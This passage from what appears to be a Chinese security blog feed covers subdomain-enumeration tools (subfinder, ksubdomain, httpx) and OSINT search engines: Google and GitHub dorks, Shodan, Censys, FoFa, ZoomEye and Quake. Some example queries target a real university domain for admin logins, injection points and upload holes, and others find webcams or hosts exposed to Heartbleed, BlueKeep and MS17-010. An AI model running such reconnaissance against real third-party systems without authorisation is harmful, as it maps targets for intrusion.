<h3 id="下载编译SubFinder与httpx"><a href="#下载编译SubFinder与httpx" class="headerlink" title="下载编译SubFinder与httpx"></a>下载编译SubFinder与httpx</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装subfinder</span></span><br><span class="line">go get -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装httpx</span></span><br><span class="line">go get -v github.com/projectdiscovery/httpx/cmd/httpx                                 </span><br></pre></td></tr></table></figure>

<h3 id="下载编译KSubdomain"><a href="#下载编译KSubdomain" class="headerlink" title="下载编译KSubdomain"></a>下载编译KSubdomain</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install libpcap-dev</span><br><span class="line"></span><br><span class="line">git clone https://github.com/knownsec/ksubdomain.git</span><br><span class="line"></span><br><span class="line">cd ksubdomain</span><br><span class="line"></span><br><span class="line">go mod download</span><br><span class="line"></span><br><span class="line">cd cmd</span><br><span class="line"></span><br><span class="line">go build ksubdomain.go</span><br><span class="line"></span><br><span class="line">mv ksubdomain /root/go/bin</span><br><span class="line"></span><br><span class="line">cd /root/go/bin</span><br></pre></td></tr></table></figure>

<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#subfinder基本使用</span></span><br><span class="line">./subfinder -d baidu.com -o output.txt                                               </span><br><span class="line"></span><br><span class="line"><span class="comment">#ksubdomain基本使用</span></span><br><span class="line">./ksubdomain -d baidu.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#管道操作</span></span><br><span class="line">./subfinder -d baidu.com -silent|./ksubdomain -verify -silent|./httpx -title -content-length -status-code</span><br><span class="line"><span class="comment">#可以用管道结合在一起配合工作。达到收集域名，验证域名，http验证存活目的。</span></span><br></pre></td></tr></table></figure>

<h2 id="在线工具查找子域名"><a href="#在线工具查找子域名" class="headerlink" title="在线工具查找子域名"></a>在线工具查找子域名</h2><p><a href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com/</a></p>
<p><a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain">https://pentest-tools.com/information-gathering/find-subdomains-of-domain</a></p>
<p><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p>
<p><a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a></p>
<p><a href="https://spyse.com/tools/subdomain-finder">https://spyse.com/tools/subdomain-finder</a></p>
<p><a href="https://www.nmmapper.com/sys/tools/subdomainfinder/">https://www.nmmapper.com/sys/tools/subdomainfinder/</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>资产收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>开源情报与搜索引擎</title>
    <url>/post/7544e3e7.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="OSINT的介绍"><a href="#OSINT的介绍" class="headerlink" title="OSINT的介绍"></a>OSINT的介绍</h2><p>开源情报是指合法地从公开和可公开获得的资源中收集数据和信息的做法。OSINT操作——无论是由IT安全专家、恶意行为者还是民族国家支持的情报人员所实施——使用先进的技术来搜索海量的可见数据，以找到满足他们需求的信息。</p>
<p>尽管下述许多OSINT工具是开源的，但本文中的“开源”并不是指开源软件运动；相反，它描述了被分析数据的公共性质。</p>
<p>OSINT在许多方面是操作安全（OPSEC）的镜像，在这个信息大爆炸的时代，OSINT对于密切关注有效信息显得至关重要。如果分析得当，这些数据可能会揭示破坏性的真相。IT安全部门越来越多地承担在自己的组织中执行OSINT操作以支持操作安全的任务。</p>
<p>如今，市场上大多数OSINT工具都提供下述三种关键功能，其中许多工具在某一特定领域表现得格外突出。</p>
<h3 id="发现面向公众的资产"><a href="#发现面向公众的资产" class="headerlink" title="发现面向公众的资产"></a>发现面向公众的资产</h3><p>它们最常见的功能是帮助IT团队发现面向公众的资产，并绘制每个人所拥有的可能导致潜在攻击面的信息。一般来说，它们不会试图寻找程序漏洞或执行渗透测试之类的事情。它们的主要工作是记录某人可以在无需诉诸黑客攻击的情况下公开找到的有关公司资产的信息。</p>
<h3 id="发现组织外的相关信息"><a href="#发现组织外的相关信息" class="headerlink" title="发现组织外的相关信息"></a>发现组织外的相关信息</h3><p>一些OSINT工具执行的第二个功能是在组织外部（例如在社交媒体帖子中或在可能位于严格定义的网络之外的域和位置）寻找相关信息。那些进行了大量收购并获得了他们要合并的公司的 IT 资产的组织会发现此功能非常有用。鉴于社交媒体的急剧增长和流行，在公司范围之外寻找敏感信息可能对任何群体都有帮助。</p>
<h3 id="将发现的信息整理成可操作的形式"><a href="#将发现的信息整理成可操作的形式" class="headerlink" title="将发现的信息整理成可操作的形式"></a>将发现的信息整理成可操作的形式</h3><p>最后，一些OSINT工具有助于将所有发现的信息整理和分组为有用且可操作的情报。为大型企业运行OSINT扫描可以产生数十万个结果，尤其是在包括内部和外部资产的情况下。整合所有数据并且能够优先处理最严重的问题将非常有帮助。</p>
<h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p>Google hacking 也叫 Google dorking，是一种利用谷歌搜索和其他谷歌应用程序来发现网站配置和计算机代码中的安全漏洞的计算机黑客技术。</p>
<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><table>
<thead>
<tr>
<th><strong>通配符</strong></th>
<th><strong>语义</strong></th>
<th><strong>说明</strong></th>
<th><strong>示例</strong></th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>包含关键字</td>
<td>+前面必须要有一个空格</td>
<td>admin +login</td>
</tr>
<tr>
<td>-</td>
<td>排除关键字</td>
<td>-前面必须要有一个空格</td>
<td>mysql -csdn</td>
</tr>
<tr>
<td>~</td>
<td>同义词</td>
<td>~前面必须要有一个空格</td>
<td>admin ~login</td>
</tr>
<tr>
<td>*</td>
<td>模糊查询</td>
<td>*代替任意字符</td>
<td>mysql**</td>
</tr>
<tr>
<td>“”</td>
<td>强调</td>
<td>-</td>
<td>“mysql”</td>
</tr>
</tbody></table>
<h3 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法"></a>高级语法</h3><table>
<thead>
<tr>
<th><strong>语法</strong></th>
<th><strong>语义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>intitle</td>
<td>包含标题</td>
</tr>
<tr>
<td>intext</td>
<td>包含内容</td>
</tr>
<tr>
<td>filetype</td>
<td>文件类型</td>
</tr>
<tr>
<td>info</td>
<td>基本信息</td>
</tr>
<tr>
<td>site</td>
<td>指定网站</td>
</tr>
<tr>
<td>inurl</td>
<td>包含某个url</td>
</tr>
<tr>
<td>link</td>
<td>包含指定链接的网页</td>
</tr>
<tr>
<td>cache</td>
<td>显示页面缓存版本</td>
</tr>
<tr>
<td>numberrange</td>
<td>搜索一个数字</td>
</tr>
<tr>
<td>daterange</td>
<td>查找指定日期范围内发布的网页</td>
</tr>
</tbody></table>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>1、查找目录列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intitle:index.of</span><br><span class="line"></span><br><span class="line">intext: index of / | ../ | Parent Directory</span><br></pre></td></tr></table></figure>

<p>2、查找ws_ftp.log文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intitle:index.of ws_ftp.log</span><br><span class="line"></span><br><span class="line">inurl:ws_ftp.log filetype:log</span><br></pre></td></tr></table></figure>

<p>3、查找wordpress泄露的敏感信息文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:wp-content/uploads/data.txt</span><br></pre></td></tr></table></figure>

<p>4、查找后台登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intext:后台登录 | intitle:后台登录</span><br><span class="line"></span><br><span class="line">inurl:/admin intext:后台管理系统</span><br></pre></td></tr></table></figure>

<p>5、查找渗透测试报告</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;渗透测试报告&quot; filetype:doc | filetype:pdf</span><br></pre></td></tr></table></figure>

<p>6、查找wut.edu.cn下的子域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:wut.edu.cn</span><br></pre></td></tr></table></figure>

<p>7、查找wut.edu.cn的后台管理地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:wut.edu.cn inurl:login|admin|admin\_login|login\_admin|system|manager|user|main|cms|dede|guanli|houtai</span><br></pre></td></tr></table></figure>

<p>8、查找wut.edu.cn的可能存在的注入点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:wut.edu.cn inurl:php?id|asp?id|aspx?id|jsp?id</span><br></pre></td></tr></table></figure>

<p>9、查找wut.eddu.cn的可能存在的文件上传漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site wut.edu.cn inurl:file|files|load|editor</span><br></pre></td></tr></table></figure>

<p>10、查看baidu.com的缓存信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cache:baidu.com</span><br></pre></td></tr></table></figure>



<h3 id="谷歌黑客数据库"><a href="#谷歌黑客数据库" class="headerlink" title="谷歌黑客数据库"></a>谷歌黑客数据库</h3><p>收录众多谷歌搜索语句</p>
<div>https://www.uedbox.com/shdb/</div><div>https://www.exploit-db.com/google-hacking-database</div>



<h2 id="GitHub-Hacking"><a href="#GitHub-Hacking" class="headerlink" title="GitHub Hacking"></a>GitHub Hacking</h2><p>GitHub是世界上最大的<del>同性交友</del>代码托管平台,超5千万开发者正在使用。</p>
<p>Github不仅能托管代码，还能对代码进行搜索，我们感受到了其便利的同时，也应该时刻注意，当你上传并公开你的代码时，一时大意，让某些敏感的配置信息文件等暴露于众。</p>
<h3 id="搜索仓库"><a href="#搜索仓库" class="headerlink" title="搜索仓库"></a>搜索仓库</h3><table>
<thead>
<tr>
<th><strong>查询</strong></th>
<th><strong>示例</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&gt;n</td>
<td>cats start:&gt;1000 匹配含有 “cats” 字样、星标超过 1000 个的仓库。</td>
</tr>
<tr>
<td>&gt;=n</td>
<td>cats topics:&gt;=5 匹配含有 “cats” 字样、有 5 个或更多主题的仓库。</td>
</tr>
<tr>
<td>&lt;n</td>
<td>cats size:&lt;10000 匹配小于 10 KB 的文件中含有 “cats” 字样的代码。</td>
</tr>
<tr>
<td>&lt;=n</td>
<td>cats stars:&lt;=50 匹配含有 “cats” 字样、星标不超过 50 个的仓库。</td>
</tr>
<tr>
<td>n..*</td>
<td>cats stars:10..* 匹配含有 “cats” 字样、有 10 个或更多星标的仓库。</td>
</tr>
<tr>
<td>*..n</td>
<td>cats stars:10..* 匹配含有 “cats” 字样、有 10 个或更多星标的仓库。</td>
</tr>
<tr>
<td>n..n</td>
<td>cats stars:10..50 匹配含有 “cats” 字样、有 10 到 50 个星号的仓库。</td>
</tr>
</tbody></table>
<h3 id="搜索代码"><a href="#搜索代码" class="headerlink" title="搜索代码"></a>搜索代码</h3><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>只能搜索小于384KB的文件。 只能搜索少于500,000个文件的存储库。</p>
<p>登陆的用户可以搜索所有公共存储库。</p>
<p>除 <strong>filename</strong> 搜索外，搜索源代码时必须至少包含一个搜索词。例如，搜索 <strong>language:javascript</strong>) 无效，而是这样：<strong>amazing language:javascript</strong>。 搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。</p>
<p>不能将以下通配符用作搜索查询的一部分：</p>
<div style="font-weight: bold;">. , : ; / ' " = \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\* ! ? # $ & \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\+ ^ | ~ &lt; \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\&gt; ( ) { } 。</div>

<p>搜索将忽略这些符号。</p>
<h4 id="日期条件"><a href="#日期条件" class="headerlink" title="日期条件"></a>日期条件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cats pushed:&lt;2012-0705 			<span class="comment">#搜索在2012年7月05日前push代码，且cats作为关键</span></span><br><span class="line">cats pushed:2016-04-30..2016-07-04 	<span class="comment">#日期区间</span></span><br><span class="line">cats created:&gt;=2017-04-01 		<span class="comment">#创建时间</span></span><br></pre></td></tr></table></figure>

<h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AND		<span class="comment">#与</span></span><br><span class="line">OR		<span class="comment">#或</span></span><br><span class="line">NOT		<span class="comment">#非</span></span><br></pre></td></tr></table></figure>

<h4 id="排除运算"><a href="#排除运算" class="headerlink" title="排除运算"></a>排除运算</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#搜索在2012年07月05日前push代码，且cats作为关键字，排除java语言仓库</span></span><br><span class="line">cats pushed:&lt;2012-07-05 - language:java</span><br></pre></td></tr></table></figure>

<h4 id="包含搜索"><a href="#包含搜索" class="headerlink" title="包含搜索"></a>包含搜索</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hacker <span class="keyword">in</span>:file  		<span class="comment">#搜索文件中包含Hacker的代码</span></span><br><span class="line">Hacker <span class="keyword">in</span>:path  		<span class="comment">#搜索路径中包含Hacker的代码</span></span><br><span class="line">Hacker <span class="keyword">in</span>:path,file  		<span class="comment">#搜索路径、文件中包含Hacker的代码</span></span><br><span class="line">console path:app/public language:javascript  	<span class="comment">#搜索关键字console，且语言为JavaScript在app/public下的代码</span></span><br></pre></td></tr></table></figure>

<h4 id="主体搜索"><a href="#主体搜索" class="headerlink" title="主体搜索"></a>主体搜索</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user:USERNAME  				<span class="comment">#用户名搜索</span></span><br><span class="line">org:ORGNAME  				<span class="comment">#组织搜索</span></span><br><span class="line">repo:USERNAME/PEPOSITORY  		<span class="comment">#指定仓库搜索</span></span><br></pre></td></tr></table></figure>

<h4 id="文件名称"><a href="#文件名称" class="headerlink" title="文件名称"></a>文件名称</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filename:config.php language:php	<span class="comment">#搜索文件名为config.php，且语言为PHP的代码</span></span><br><span class="line">mail filename:.properties			<span class="comment">#搜索JAVA项目的配置文件，且中包含mail的代码</span></span><br></pre></td></tr></table></figure>

<h4 id="扩展名搜索"><a href="#扩展名搜索" class="headerlink" title="扩展名搜索"></a>扩展名搜索</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#extension:EXTENSION  指定扩展名搜索</span></span><br><span class="line">php extension:config</span><br></pre></td></tr></table></figure>



<h3 id="自动化工具——GitMiner"><a href="#自动化工具——GitMiner" class="headerlink" title="自动化工具——GitMiner"></a>自动化工具——GitMiner</h3><p>GitMiner是一款自动化的高级敏感内容挖掘工具。此工具旨在通过代码或代码片段在github搜索页面进行挖掘，并以此来证明公共存储库的脆弱性，以及将包含敏感信息的代码存储在其中所带来的安全隐患。</p>
<p>项目地址：<a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a></p>
<p><img src="https://camo.githubusercontent.com/2948ef418da7976011be94027341182378fc0055361a079d8c2813febd71a00b/68747470733a2f2f322e62702e626c6f6773706f742e636f6d2f2d4762707a524f6945796e512f56744c7974664d715169492f4141414141414141626e6b2f356844706850344d6266342f73313630302f776f7264707265737345582e706e67" alt="Screenshot"></p>
<h2 id="Shodan-搜索引擎"><a href="#Shodan-搜索引擎" class="headerlink" title="Shodan 搜索引擎"></a>Shodan 搜索引擎</h2><p>Shodan 在百度百科里被给出了这么一句话介绍： Shodan 是互联网上最可怕的搜索引擎。为什么呢？与谷歌、百度等搜索引擎爬取网页信息不同，Shodan 爬取的是互联网上所有设备的 IP 地址及其端口号。</p>
<p>网址：<a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
<h3 id="高级过滤搜索"><a href="#高级过滤搜索" class="headerlink" title="高级过滤搜索"></a>高级过滤搜索</h3><ul>
<li>hostname：搜索指定的主机或域名，例如 hostname:“google”</li>
<li>port：搜索指定的端口或服务，例如 port:“8080”</li>
<li>country：搜索指定的国家，例如 country:“CN”</li>
<li>city：搜索指定的城市，例如 city:“yantai”</li>
<li>org：搜索指定的组织或公司，例如 org:“google”</li>
<li>isp：搜索指定的ISP供应商，例如 isp:“China Telecom”</li>
<li>product：搜索指定的操作系统/软件/平台，例如 product:“Apache httpd”</li>
<li>version：搜索指定的软件版本，例如 version:“2.1.2”</li>
<li>geo：搜索指定的地理位置，参数为经纬度，例如 geo:“44.56, 119.65”</li>
<li>before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:“11-11-15”</li>
<li>net：搜索指定的IP地址或子网，例如 net:“102.45.10.0/24”</li>
</ul>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>1、查找位于合肥的Apache服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache city:&quot;Hefei&quot;</span><br></pre></td></tr></table></figure>

<p>2、查找位于国内的Nginx服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx country:&quot;CN&quot;</span><br></pre></td></tr></table></figure>

<p>3、查找GWS（Google Web Server）服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server:gws hostname:&quot;google&quot;</span><br></pre></td></tr></table></figure>

<p>4、查找指定网段华为设备</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">huawei net:&quot;64.191.146.0/24&quot;</span><br></pre></td></tr></table></figure>

<p>5、查找国内的 海康威视网络摄像头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server:Hikvision-Webs country:&quot;CN&quot;</span><br></pre></td></tr></table></figure>

<p>6、查找SQ-WEBCAM摄像头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server: SQ-WEBCAM</span><br></pre></td></tr></table></figure>

<p>7、搜索美国受“心脏滴血”漏洞影响的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">country:US vuln:CVE-2014-0160</span><br></pre></td></tr></table></figure>

<p>8、根据网页图标收集资产</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.favicon.hash:-1825654886</span><br><span class="line"></span><br><span class="line">注：查询值为目标站点图标文件的hash值</span><br></pre></td></tr></table></figure>



<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>在每次查询后，在左上角有几个功能，Exploits，maps，create report等</p>
<p><strong>exploits</strong>是系统帮我们查找不同类型的方式来查找。</p>
<p><strong>maps</strong>是生成地图，用来查看主机在世界各地的分布。红色标记就是主机地址</p>
<p><strong>create report</strong>是针对此次搜索，生成报告发给邮件，也可以去账户里查看以前生成的报告。</p>
<h3 id="Shodan命令行"><a href="#Shodan命令行" class="headerlink" title="Shodan命令行"></a>Shodan命令行</h3><p>Shodan搜索引擎拥有自己的API接口，前提是先注册。可以使用命令行工具，也可以使用python等编程软件调用。</p>
<p>Shodan命令行模式有很多优点，比如导出搜索数据与解析搜索数据，还有可以指定显示数据得关键字段。</p>
<p>1、导入key：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan init &lt;key&gt;</span><br></pre></td></tr></table></figure>

<p>2、显示自己的公网ip：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan myip</span><br></pre></td></tr></table></figure>

<p>3、查看指定cve漏洞在shodan发现的总数 ‘’</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan count vuln:cve-2019-0708</span><br></pre></td></tr></table></figure>

<p>4、查看指定cve漏洞的地区分布情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan stats vuln:cve-2019-0708</span><br></pre></td></tr></table></figure>

<p>5、列出存在漏洞的top20的私有云服务商</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan stats --facets org:20 vuln:cve-2019-0708 tag:cloud</span><br></pre></td></tr></table></figure>

<p>7、筛选指定端口、指定协议存在的漏洞数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan stats port:445 SMB vuln:ms17-010</span><br></pre></td></tr></table></figure>

<p>8、 查看某ip相关的所有信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan host 219.140.59.238</span><br></pre></td></tr></table></figure>

<p>9、保存某ip的相关信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan host --save 219.140.59.238</span><br></pre></td></tr></table></figure>

<p>10、查看下载下来的数据信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan parse 219.140.59.238.json.gz</span><br></pre></td></tr></table></figure>

<p>11、通过扫描得到最新的服务器信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan scan submit 219.140.59.238</span><br></pre></td></tr></table></figure>



<h2 id="Censys-搜索引擎"><a href="#Censys-搜索引擎" class="headerlink" title="Censys 搜索引擎"></a>Censys 搜索引擎</h2><p>与最流行的搜索引擎Shodan非常类似。Censys是一款免费的搜索引擎，最初由密歇根大学的研究人员在10月发行，目前由谷歌提供支持。 Censys搜索引擎能够扫描整个互联网，Censys 每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
<p>Censys更偏向于证书查询</p>
<p>网址：<a href="https://search.censys.io/">https://search.censys.io/</a></p>
<h3 id="搜索示例"><a href="#搜索示例" class="headerlink" title="搜索示例"></a>搜索示例</h3><p>默认情况下censys支持全文检索，支持正则。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip:23.0.0.0/8 or 8.8.8.0/24　　						可以使用逻辑运算</span><br><span class="line"></span><br><span class="line">services.http.response.status_code: 200　　			指定状态</span><br><span class="line"></span><br><span class="line">services.http.response.status_code: [200 to 300]　　	200-300之间的状态码</span><br><span class="line"></span><br><span class="line">location.country_code: DE　　							国家</span><br><span class="line"></span><br><span class="line">services.port: 21 or services.service_name: FTP　　	协议</span><br><span class="line"></span><br><span class="line">services.software.product:apache　　					服务器类型版本</span><br><span class="line"></span><br><span class="line">autonomous_system.description: University　　			系统描述</span><br></pre></td></tr></table></figure>



<h2 id="FoFa-搜索引擎"><a href="#FoFa-搜索引擎" class="headerlink" title="FoFa 搜索引擎"></a>FoFa 搜索引擎</h2><p>FOFA 是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
<p>FoFa更偏向于企业资产收集</p>
<p>网址：<a href="https://fofa.so/">https://fofa.so/</a></p>
<h3 id="搜索示例-1"><a href="#搜索示例-1" class="headerlink" title="搜索示例"></a>搜索示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;abc&quot; 	从标题中搜索abc。例：标题中有北京的网站。</span><br><span class="line"></span><br><span class="line">header=&quot;abc&quot; 	从http头中搜索abc。例：jboss服务器。</span><br><span class="line"></span><br><span class="line">body=&quot;abc&quot; 		从html正文中搜索abc。例：正文包含Hacked by。</span><br><span class="line"></span><br><span class="line">domain=&quot;qq.com&quot; 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。</span><br><span class="line"></span><br><span class="line">host=&quot;.gov.cn&quot; 	从url中搜索.gov.cn,注意搜索要用host作为名称。</span><br><span class="line"></span><br><span class="line">port=&quot;443&quot; 		查找对应443端口的资产。例： 查找对应443端口的资产。</span><br><span class="line"></span><br><span class="line">ip=&quot;1.1.1.1&quot; 	从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。</span><br><span class="line"></span><br><span class="line">protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。</span><br><span class="line"></span><br><span class="line">city=”Beijing” 	搜索指定城市的资产。例： 搜索指定城市的资产。</span><br><span class="line"></span><br><span class="line">region=&quot;Zhejiang&quot; 搜索指定行政区的资产。例： 搜索指定行政区的资产。</span><br><span class="line"></span><br><span class="line">country=&quot;CN&quot; 	搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。</span><br><span class="line"></span><br><span class="line">cert=&quot;google.com&quot; 搜索证书(https或者imaps等)中带有google.com的资产。</span><br></pre></td></tr></table></figure>

<h3 id="高级搜索示例"><a href="#高级搜索示例" class="headerlink" title="高级搜索示例"></a>高级搜索示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;powered by&quot; &amp;&amp; title!=discuz</span><br><span class="line"></span><br><span class="line">title!=&quot;powered by&quot; &amp;&amp; body=discuz</span><br><span class="line"></span><br><span class="line">( body=&quot;content=WordPress&quot; || (header=&quot;X-Pingback&quot; &amp;&amp; header=&quot;/xmlrpc.php&quot; &amp;&amp; body=&quot;/wp-includes/&quot;) ) &amp;&amp; host=&quot;gov.cn&quot;</span><br></pre></td></tr></table></figure>



<h2 id="钟馗之眼"><a href="#钟馗之眼" class="headerlink" title="钟馗之眼"></a>钟馗之眼</h2><p>国内互联网安全厂商知道创宇开放了他们的海量数据库，对之前沉淀的数据进行了整合、整理，打造了一个名符其实的网络空间搜索引擎ZoomEye，该搜索引擎的后端数据计划包括两部分：</p>
<p>1、网站组件指纹：包括操作系统，Web服务，服务端语言，Web开发框架，Web应用，前端库及第三方组件等等。</p>
<p>2、主机设备指纹：结合NMAP大规模扫描结果进行整合。 目前只上线了第一部分网站组件指纹。</p>
<p>钟馗之眼更偏向于Web应用层面的搜索</p>
<p>网址：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
<h3 id="搜索示例-2"><a href="#搜索示例-2" class="headerlink" title="搜索示例"></a>搜索示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:nginx　　				组件名</span><br><span class="line"></span><br><span class="line">ver:1.0　　				版本</span><br><span class="line"></span><br><span class="line">os:windows　　			操作系统</span><br><span class="line"></span><br><span class="line">country:”China”　　		国家</span><br><span class="line"></span><br><span class="line">city:”hangzhou”　　		城市</span><br><span class="line"></span><br><span class="line">port:80　　				端口</span><br><span class="line"></span><br><span class="line">hostname:google　　		主机名</span><br><span class="line"></span><br><span class="line">site:thief.one　　		网站域名</span><br><span class="line"></span><br><span class="line">desc:nmask　　			描述</span><br><span class="line"></span><br><span class="line">keywords:nmask’blog　	关键词</span><br><span class="line"></span><br><span class="line">service:ftp　　			服务类型</span><br><span class="line"></span><br><span class="line">ip:8.8.8.8　　			ip地址</span><br><span class="line"></span><br><span class="line">cidr:8.8.8.8/24　　		ip地址段</span><br></pre></td></tr></table></figure>



<h3 id="Kunyu-坤舆"><a href="#Kunyu-坤舆" class="headerlink" title="Kunyu(坤舆)"></a>Kunyu(坤舆)</h3><p>Kunyu(坤舆)，是一款基于ZoomEye API开发的信息收集工具，旨在让企业资产收集更高效，使更多的安全从业者了解、使用网络空间资源测绘技术。</p>
<p>项目地址：<a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></p>
<h2 id="360-QUAKE"><a href="#360-QUAKE" class="headerlink" title="360 QUAKE"></a>360 QUAKE</h2><p>360 Quake 网络空间测绘系统是360网络安全响应中心（360-CERT）自主设计研发的全球网络空间测绘系统，能够对全球IPv4、IPv6地址进行持续性探测，实时感知全球网络空间中各类资产并发现其安全风险。</p>
<p>网址：<a href="https://quake.360.cn/quake/#/index">https://quake.360.cn/quake/#/index</a></p>
<p>搜索语法：<a href="https://quake.360.cn/quake/#/help?id=5eb238f110d2e850d5c6aec8&title=%E6%A3%80%E7%B4%A2%E5%85%B3%E9%94%AE%E8%AF%8D">https://quake.360.cn/quake/#/help?id=5eb238f110d2e850d5c6aec8&amp;title=检索关键词</a></p>
<h3 id="QUAKE-API"><a href="#QUAKE-API" class="headerlink" title="QUAKE API"></a>QUAKE API</h3><p>使用go语言编写，基于命令行，支持QuakeAPI进行查询。</p>
<p>项目地址：<a href="https://github.com/YetClass/QuakeAPI">https://github.com/YetClass/QuakeAPI</a></p>
